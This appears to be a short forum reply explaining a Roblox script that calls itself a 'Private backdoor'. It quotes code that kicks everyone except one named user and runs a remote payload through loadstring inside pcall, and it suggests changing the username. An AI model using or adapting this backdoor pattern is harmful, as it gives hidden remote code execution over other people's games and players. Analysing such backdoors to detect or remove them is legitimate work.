@BLUE2SPOOKYSCARY The script doesn’t kick you because of two main reasons:

It explicitly excludes your username

if plr ~= game.Players["hyperionsobadlolz"] then
    plr:Kick("Private backdoor, dont touch.")
    return
end


This means it only kicks players who are NOT "hyperionsobadlolz". you can just change the username.

The rest of the code often doesn’t run properly

local success, err = pcall(function()
    loadstring(payload)()
end)


This uses pcall, which catches errors silently.

If the RemoteEvent isn’t created or the payload fails, the Kick line never executes.
